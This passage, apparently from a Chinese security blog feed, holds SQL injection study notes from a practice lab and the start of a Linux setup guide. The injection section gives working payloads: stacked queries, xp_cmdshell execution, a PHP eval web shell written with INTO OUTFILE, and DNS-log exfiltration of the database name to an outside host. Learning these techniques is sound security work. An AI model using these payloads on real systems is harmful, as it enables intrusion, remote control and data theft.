class="operator">*</span>),concat_ws(<span class="string">&#x27;-&#x27;</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),(<span class="keyword">select</span> database()),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="报错注入显示其他数据"><a href="#报错注入显示其他数据" class="headerlink" title="报错注入显示其他数据"></a>报错注入显示其他数据</h3><h2 id="insert-update-delete注入的利用"><a href="#insert-update-delete注入的利用" class="headerlink" title="insert update delete注入的利用"></a>insert update delete注入的利用</h2><h3 id="基于insert下的报错："><a href="#基于insert下的报错：" class="headerlink" title="基于insert下的报错："></a>基于insert下的报错：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><h2 id="union注入和堆叠注入的区别"><a href="#union注入和堆叠注入的区别" class="headerlink" title="union注入和堆叠注入的区别"></a>union注入和堆叠注入的区别</h2><p><code>union</code>或者<code>union all</code>执行的语句类型是有限的，可以用来执行查询语句，且在 MySQL 中返回的列数需要相等；而堆叠注入可以执行的是任意的语句。</p><h2 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h2><p>堆叠注入并不是在每一个环境下都可以执行，可能受到 API 或者数据库引擎不支持的限制，同时权限不足也会使攻击者无法修改数据或者调用一些程序。<br>虽然前面提到了堆叠查询可以执行任意的 SQL 语句，但是这种注入方式并不是十分完美。在我们的 Web 系统中，代码通常只返回一个查询结果，因此堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面无法看到返回结果。<br>因此在读取数据时，建议使用<code>union</code>注入。同时在使用堆叠注入之前，我们也需要知道一些数据库相关信息如表名，列名等。</p><h2 id="数据库实例"><a href="#数据库实例" class="headerlink" title="数据库实例"></a>数据库实例</h2><p>下面介绍几个常用数据库的堆叠操作：基本操作与增删查改。</p><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><ol><li>新建表<code>test</code><br><code>select * from users where id=1;create table test like users;</code></li><li>删除新建表<code>test</code><br><code>select * from users where id=1;drop table test;</code></li><li>查询数据<br><code>select * from users where id=1;select 1,2,3;</code></li><li>加载文件<br><code>select * from users where id=1;select load_file(&#39;c:/test.php&#39;);</code></li><li>修改数据<br><code>select * from users where id=1;insert into users(id,username,password) values(&#39;100&#39;,&#39;name&#39;,&#39;pswd&#39;);</code><h4 id="load-file-函数"><a href="#load-file-函数" class="headerlink" title="load_file()函数"></a>load_file()函数</h4><blockquote><p>读取文件并返回文件内容为字符串。<br>要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限；该文件所有字节可读，但文件内容必须小于<code>max_allowed_packet</code>。<br>如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回<code>NULL</code>。</p></blockquote></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2020/webp/2185076/1600696071121-071800d8-0416-4dfa-a4a0-638db8738d40.webp#height=151&id=zAC08&originHeight=151&originWidth=594&originalType=binary&ratio=1&size=0&status=done&style=none&width=594"><br><strong>注意：</strong>这里还是有数据导入导出权限的问题，在 Less 7 中也遇到过。</p><blockquote><p>Mysql数据库需要在指定的目录下进行数据的导出。<br><code>secure_file_priv</code>这个参数用来限制数据导入和导出操作的效果，例如执行<code>load data</code>、<code>into outfile</code>语句和<code>load_file()</code>函数,这些操作需要用户具有<code>file</code>权限。<br><strong>1</strong>. 如果这个参数为空，这个变量没有效果。<br><strong>2</strong>. 如果这个参数设为一个目录名，Mysql服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它.<br><strong>3</strong>. 如果这个参数为<code>null</code>，Mysql服务会禁止导入和导出操作。这个参数在MySQL 5.7.6版本引入。</p></blockquote><blockquote><p>于是查看<code>secure_file_priv</code>：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%secure%&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/webp/2185076/1600696357325-bca2245c-93c5-435c-ad3c-51e459254531.webp#height=187&id=WYkya&originHeight=187&originWidth=776&originalType=binary&ratio=1&size=0&status=done&style=none&width=776"></p><blockquote><p>在指定的位置导出文件：</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2020/webp/2185076/1600696377984-f52bbfbc-d756-4da1-9696-33826240b482.webp#height=136&id=IWPO0&originHeight=136&originWidth=1189&originalType=binary&ratio=1&size=0&status=done&style=none&width=1189"><br><img src="https://cdn.nlark.com/yuque/0/2020/webp/2185076/1600696388383-0d217aa8-e3f1-4db5-9fb8-b7550ddf6d29.webp#height=152&id=zTJDW&originHeight=152&originWidth=803&originalType=binary&ratio=1&size=0&status=done&style=none&width=803"><br><strong>注意：</strong>在 MySQL 中，需要注意路径转义的问题，即用<code>/</code>或<code>\\</code>分隔。<br>参考：<br><a href="https://www.cnblogs.com/missmzt/p/7676800.html">windows下mysql loadfile返回NULL的解决</a><br><a href="https://www.cnblogs.com/devcjq/articles/6409470.html">MySQL里设置或修改系统变量的几种方法</a><br>这里有修改系统变量的几种方法，可以考虑注入时涉及文件操作时先修改权限。</p><h3 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h3><ol><li><p>新建表<br><code>select * from test;create table test2(ss CHAR(8));</code></p></li><li><p>删除新建表<br><code>select * from test;drop table test2;</code></p></li><li><p>查询数据<br><code>select * from test;select 1,2,3;</code></p></li><li><p>修改数据<br><code>select * from test;update test set name=&#39;name&#39; where id=1;</code></p></li><li><p>SQL Server中最为重要的存储过程的执行<br><code>select * from test where id=1;exec master..xp_cmdshell &#39;ipconfig&#39;</code></p><h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p>上面的图中已经提及，Oracle 不能使用堆叠注入，可以从图中看到，当有两条语句在同一行时，直接报错无效字符。<br><img src="https://cdn.nlark.com/yuque/0/2020/webp/2185076/1600696752821-661c62e1-7214-4093-aee4-b9ed4c8bd8ec.webp#height=144&id=IWcmg&originHeight=144&originWidth=961&originalType=binary&ratio=1&size=0&status=done&style=none&width=961"></p><h3 id="Postgresql"><a href="#Postgresql" class="headerlink" title="Postgresql"></a>Postgresql</h3></li><li><p>新建表<br><code>select * from user_test;create table user_data(id DATE);</code></p></li><li><p>删除新建表<br><code>select * from user_test;delete from user_data;</code></p></li><li><p>查询数据<br><code>select * from user_test;select 1,2,3;</code></p></li><li><p>修改数据<br><code>select * from user_test;update user_test set name=&#39;new&#39; where name=&#39;name&#39;;</code></p><h2 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h2><p>堆叠注入需要依靠前文所写的各种注入方式来获取数据库的信息，在这里只演示如何插入新的数据。</p><blockquote><p><code>http://localhost:8088/sqlilabs/Less-38/?id=1&#39;;insert into users(id,username,password) values(38,&#39;Less38&#39;,&#39;Less38&#39;)--+</code></p></blockquote></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2020/webp/2185076/1600696778642-b39fa583-afbd-4653-a746-024a601c1d0e.webp#height=122&id=LWIKX&originHeight=122&originWidth=396&originalType=binary&ratio=1&size=0&status=done&style=none&width=396"></p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>时间注入利用sleep()和benchmark()等函数让sql语句执行时间更长</p><h2 id="判断是否存在时间盲注"><a href="#判断是否存在时间盲注" class="headerlink" title="判断是否存在时间盲注"></a>判断是否存在时间盲注</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and sleep(5)</span><br></pre></td></tr></table></figure><h2 id="sleep函数判断页面响应时间"><a href="#sleep函数判断页面响应时间" class="headerlink" title="sleep函数判断页面响应时间"></a>sleep函数判断页面响应时间</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#if(判断条件，为true时执行，为false时执行)</span><br><span class="line">and if(ascii(substring(database(),1,1))&lt;100,1,sleep(5))</span><br><span class="line">and if(substring(database(),1,1)=&#x27;a&#x27;,sleep(3),null)</span><br><span class="line">#Benchmark() 函数，它是用于测试性能的。 Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次</span><br><span class="line">benchmark(100000000,md(5))</span><br></pre></td></tr></table></figure><h2 id="Timing-Attack"><a href="#Timing-Attack" class="headerlink" title="Timing Attack"></a>Timing Attack</h2><p>MySQL<br>benchmark(100000000,md(5))<br>sleep(3)<br>PostgreSQL<br>PG_sleep(5)<br>Generate_series(1,1000000)<br>SQLServer<br>waitfor delay  ‘0:0:5’</p><h1 id="Http-Header注入"><a href="#Http-Header注入" class="headerlink" title="Http Header注入"></a>Http Header注入</h1><p>后台开发人员为了验证客户端头信息（比如常用的cookie验证）<br>或者通过http header头信息获取客户端的一些信息，比如useragent,accept字段等等。<br>会对客户端的http header信息进行获取并使用SQL进行处理，如果此时没有足够的安全考虑则可能会导致基于http header的SQL Inject漏洞。</p><h2 id="错误-POST-User-Agent-请求头注入"><a href="#错误-POST-User-Agent-请求头注入" class="headerlink" title="错误_POST_User-Agent_请求头注入"></a>错误_POST_User-Agent_请求头注入</h2><blockquote><p>注意<br>‘ or updatexml(1 , concat(‘#’,(database())),0) , ‘’,’’) #<br>这里并不是URL而是HTTP头，所以+并不会被转义为(空格)，于是末尾的注释符号要变为#</p></blockquote><h2 id="错误-POST-Referer-请求头注入"><a href="#错误-POST-Referer-请求头注入" class="headerlink" title="错误_POST_Referer_请求头注入"></a>错误_POST_Referer_请求头注入</h2><blockquote><p>‘ or updatexml(1,concat(‘#’, (database())),0), 0)#</p></blockquote><h1 id="二次注入（存储型注入）"><a href="#二次注入（存储型注入）" class="headerlink" title="二次注入（存储型注入）"></a>二次注入（存储型注入）</h1><p>导致 SQL 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发 SQL 注入</p><h2 id="二次注入的一般过程："><a href="#二次注入的一般过程：" class="headerlink" title="二次注入的一般过程："></a>二次注入的一般过程：</h2><ol><li>通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了构造的 SQL 语句或者命令。</li><li>服务端应用程序会将提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</li><li>向服务端发送第二个与第一次不相同的请求数据信息。</li><li>服务端接收到提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致在第一次请求中构造的 SQL 语句或者命令在服务端环境中执行。</li><li>服务端返回执行的处理结果数据信息，便可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。<h2 id="当登录界面对username和password都做了过滤"><a href="#当登录界面对username和password都做了过滤" class="headerlink" title="当登录界面对username和password都做了过滤"></a>当登录界面对username和password都做了过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);</span><br><span class="line">$password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);</span><br></pre></td></tr></table></figure><h2 id="当注入点在修改密码处："><a href="#当注入点在修改密码处：" class="headerlink" title="当注入点在修改密码处："></a>当注入点在修改密码处：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; WHERE username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27;</span><br></pre></td></tr></table></figure><h2 id="将其改变为："><a href="#将其改变为：" class="headerlink" title="将其改变为："></a>将其改变为：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; WHERE username=&#x27;$username&#x27;-- and password=&#x27;$curr_pass&#x27;</span><br></pre></td></tr></table></figure>且已知注册时未有任何过滤，闭合查询语句为单引号，即在注册用户时构造admin’– (有空格)或admin’#。<h1 id="通过SQL-Inject漏洞对服务器远程控制"><a href="#通过SQL-Inject漏洞对服务器远程控制" class="headerlink" title="通过SQL Inject漏洞对服务器远程控制"></a>通过SQL Inject漏洞对服务器远程控制</h1><h2 id="通过sqli写入恶意代码"><a href="#通过sqli写入恶意代码" class="headerlink" title="通过sqli写入恶意代码"></a>通过sqli写入恶意代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2 into outfile &quot;/var/www/html/1.txt&quot;</span><br></pre></td></tr></table></figure><code>into outfile </code>将<code>select</code>的结果写入到指定目录的<code>1.txt</code>中<br>在一些没有回显的注入中可以使用<code>into outfile</code>将结果写入到指定文件，然后访问获取<br>前期条件：</li><li>需要知道远程目录</li><li>需要远程目录有写权限</li><li>需要数据库开启<code>secure_file_priv</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select &quot;&lt;?php @eval($_POST[&#x27;chopper&#x27;]);?&gt;&quot;,2 into outfile &quot;/var/www/html/1.php&quot;#</span><br></pre></td></tr></table></figure><h1 id="具体语句备忘录"><a href="#具体语句备忘录" class="headerlink" title="具体语句备忘录"></a>具体语句备忘录</h1><h3 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT database();</span><br><span class="line">SELECT schema_name FROM information_schema.schemata;</span><br></pre></td></tr></table></figure><h3 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h3></li></ol><ul><li><p>union 查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--MySQL 4版本时用version=9，MySQL 5版本时用version=10</span><br><span class="line">UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;   /* 列出当前数据库中的表 */</span><br><span class="line">UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database();   /* 列出所有用户自定义数据库中的表 */</span><br><span class="line">SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!=&#x27;information_schema&#x27; AND table_schema!=&#x27;mysql&#x27;;</span><br></pre></td></tr></table></figure></li><li><p>盲注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; &#x27;A&#x27;</span><br></pre></td></tr></table></figure></li><li><p>报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));</span><br><span class="line">-- 在5.1.5版本中成功。</span><br></pre></td></tr></table></figure><h3 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h3></li><li><p>union 查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#x27;tablename&#x27;</span><br></pre></td></tr></table></figure></li><li><p>盲注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; &#x27;A&#x27;</span><br></pre></td></tr></table></figure></li><li><p>报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 在5.1.5版本中成功</span><br><span class="line">AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)</span><br><span class="line">-- MySQL 5.1版本修复了</span><br><span class="line">AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));</span><br></pre></td></tr></table></figure></li><li><p>利用 <code>PROCEDURE ANALYSE()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-- 这个需要 web 展示页面有你所注入查询的一个字段</span><br><span class="line">-- 获得第一个段名</span><br><span class="line">SELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE()</span><br><span class="line">-- 获得第二个段名</span><br><span class="line">1 LIMIT 1,1 PROCEDURE ANALYSE()</span><br><span class="line">-- 获得第三个段名</span><br><span class="line">1 LIMIT 2,1 PROCEDURE ANALYSE()</span><br></pre></td></tr></table></figure><h3 id="根据列名查询所在的表"><a href="#根据列名查询所在的表" class="headerlink" title="根据列名查询所在的表"></a>根据列名查询所在的表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 查询字段名为 username 的表</span><br><span class="line">SELECT table_name FROM information_schema.columns WHERE column_name = &#x27;username&#x27;;</span><br><span class="line">-- 查询字段名中包含 username 的表</span><br><span class="line">SELECT table_name FROM information_schema.columns WHERE column_name LIKE &#x27;%user%&#x27;;</span><br></pre></td></tr></table></figure><h3 id="绕过引号限制"><a href="#绕过引号限制" class="headerlink" title="绕过引号限制"></a>绕过引号限制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- hex 编码</span><br><span class="line">SELECT * FROM Users WHERE username = 0x61646D696E</span><br><span class="line">-- char() 函数</span><br><span class="line">SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</span><br></pre></td></tr></table></figure><h3 id="绕过字符串黑名单"><a href="#绕过字符串黑名单" class="headerlink" title="绕过字符串黑名单"></a>绕过字符串黑名单</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT &#x27;a&#x27; &#x27;d&#x27; &#x27;mi&#x27; &#x27;n&#x27;;</span><br><span class="line">SELECT CONCAT(&#x27;a&#x27;, &#x27;d&#x27;, &#x27;m&#x27;, &#x27;i&#x27;, &#x27;n&#x27;);</span><br><span class="line">SELECT CONCAT_WS(&#x27;&#x27;, &#x27;a&#x27;, &#x27;d&#x27;, &#x27;m&#x27;, &#x27;i&#x27;, &#x27;n&#x27;);</span><br><span class="line">SELECT GROUP_CONCAT(&#x27;a&#x27;, &#x27;d&#x27;, &#x27;m&#x27;, &#x27;i&#x27;, &#x27;n&#x27;);</span><br></pre></td></tr></table></figure><p>使用 <code>CONCAT()</code> 时，任何个参数为 null，将返回 null，推荐使用 <code>CONCAT_WS()</code>。<code>CONCAT_WS()</code>函数第一个参数表示用哪个字符间隔所查询的结果。</p><h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><p><code>CASE</code>, <code>IF()</code>, <code>IFNULL()</code>, <code>NULLIF()</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT IF(1=1, true, false);</span><br><span class="line">SELECT CASE WHEN 1=1 THEN true ELSE false END;</span><br></pre></td></tr></table></figure><h3 id="延时函数"><a href="#延时函数" class="headerlink" title="延时函数"></a>延时函数</h3><p><code>SLEEP()</code>, <code>BENCHMARK()</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1(&#x27;true&#x27;)), false)) - &#x27;</span><br></pre></td></tr></table></figure><h3 id="order-by-后的注入"><a href="#order-by-后的注入" class="headerlink" title="order by 后的注入"></a>order by 后的注入</h3><p><code>order by</code> 由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。一般带有 <code>order</code> 或者 <code>order by</code> 的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：<br>原始链接：<code>[http://www.test.com/list.php?order=vote](http://www.test.com/list.php?order=vote)</code><br>根据 <code>vote</code> 字段排序。找到投票数最大的票数 <code>num</code> 然后构造以下链接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/list.php?order=abs(vote-(length(user())&gt;0)*num)+asc</span><br></pre></td></tr></table></figure><p>看排序是否变化。还有一种方法不需要知道任何字段信息，使用 <code>rand</code> 函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/list.php?order=rand(true)</span><br><span class="line">http://www.test.com/list.php?order=rand(false)</span><br></pre></td></tr></table></figure><p>以上两个会返回不同的排序，判断表名中第一个字符是否小于 128 的语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)&lt;=128))</span><br></pre></td></tr></table></figure><h3 id="DNSLOG-注入"><a href="#DNSLOG-注入" class="headerlink" title="DNSLOG 注入"></a>DNSLOG 注入</h3></li></ul><p><strong>DNS 在解析的时候会留下日志，通过读取多级域名的解析日志，来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。</strong><br>dnslog 平台：<a href="http://ceye.io/">http://ceye.io/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use security;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; select load_file(&#x27;\\\\test.xxx.ceye.io\\abc&#x27;);</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| load_file(&#x27;\\\\test.xxx.ceye.io\\abc&#x27;) |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| NULL                                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row in set (22.05 sec)</span><br><span class="line">mysql&gt; select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxx.ceye.io\\abc&#x27;));</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">| load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxx.ceye.io\\abc&#x27;)) |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">| NULL                                                                 |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2185076/1597548395375-e1e70d26-0ba1-46cd-9f07-96a08a7d917b.png#height=155&id=nECyE&margin=%5Bobject%20Object%5D&name=image.png&originHeight=155&originWidth=1118&originalType=binary&ratio=1&size=29635&status=done&style=none&width=1118" alt="image.png"><br><a href="https://www.yuque.com/attachments/yuque/0/2020/txt/2185076/1601276960233-95215603-fdc6-44e2-820d-5ef4930a0654.txt?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2020/txt/2185076/1601276960233-95215603-fdc6-44e2-820d-5ef4930a0654.txt%22,%22name%22:%22mysql%E5%B8%B8%E7%94%A8%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A51.txt%22,%22size%22:1477,%22type%22:%22text/plain%22,%22ext%22:%22txt%22,%22status%22:%22done%22,%22uid%22:%221601276959822-0%22,%22progress%22:%7B%22percent%22:99%7D,%22percent%22:0,%22id%22:%229WWpk%22,%22card%22:%22file%22%7D">mysql常用手工注入语句1.txt</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux初始化</title>
      <link href="/2021/08/11/Linux%E5%88%9D%E5%A7%8B%E5%8C%96/"/>
      <url>/2021/08/11/Linux%E5%88%9D%E5%A7%8B%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>工作的时候经常会创建很多Linux主机，为了使这些机器马上能有生产力，写一个关于初始化它们的文档</p><h2 id="Centos初始化"><a href="#Centos初始化" class="headerlink" title="Centos初始化"></a>Centos初始化</h2><h3 id="添加sudo权限"><a href="#添加sudo权限" class="headerlink" title="添加sudo权限"></a>添加sudo权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su</span><br><span class="line">vi /etc/sudoers</span><br><span class="line">username ALL=(ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure><h3 id="更改yum源"><a href="#更改yum源" class="headerlink" title="更改yum源"></a>更改yum源</h3><p><strong>centos8</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo</span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure><h3 id="开启ssh"><a href="#开启ssh" class="headerlink" title="开启ssh"></a>开启ssh</h3><p>检测是否安装ssh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum list installed | grep openssh-server</span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install openssh-server</span><br></pre></td></tr></table></figure><p>配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">Port 22</span><br><span class="line"><span class="meta">#</span><span class="bash">AddressFamily any</span></span><br><span class="line">ListenAddress 0.0.0.0</span><br><span class="line">ListenAddress ::</span><br></pre></td></tr></table></figure><p>开启服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service sshd start</span><br></pre></td></tr></table></figure><p>检测 sshd服务是否开启 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -e | grep sshd</span><br></pre></td></tr></table></figure><p>检测 22 号端口是否开启 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an | grep 22</span><br></pre></td></tr></table></figure><p>将 sshd 服务设置为开机自启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable sshd.service</span><br></pre></td></tr></table></figure><p>检测是否开启开机自动启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files | grep sshd</span><br></pre></td></tr></table></figure><h3 id="重新设置root密码"><a href="#重新设置root密码" class="headerlink" title="重新设置root密码"></a>重新设置root密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl 